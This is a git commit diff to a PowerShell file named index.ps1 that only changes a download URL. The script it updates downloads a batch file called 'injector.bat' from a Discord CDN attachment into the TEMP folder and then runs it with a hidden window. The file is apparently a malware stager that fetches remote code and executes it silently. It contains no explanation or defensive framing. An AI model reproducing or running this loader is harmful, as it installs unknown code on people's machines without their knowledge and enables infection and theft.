c6603c4b77cdeef5a7904d2cb7e54014b784681a
IStrawI <102626807+IStrawI@users.noreply.github.com>
2023-08-17 15:29:49 +0200

    Update index.ps1

--- index.ps1
+++ index.ps1
@@ -1,3 +1,3 @@
-iwr -useb https://cdn.discordapp.com/attachments/1133916220219990187/1133945858086416424/Sized.bat -o $env:TEMP\injector.bat
+iwr -useb https://cdn.discordapp.com/attachments/1137771634808332378/1141724610216337408/Sized.bat -o $env:TEMP\injector.bat
 Start-Sleep -s 1
 saps $env:TEMP\injector.bat -WindowStyle Hidden
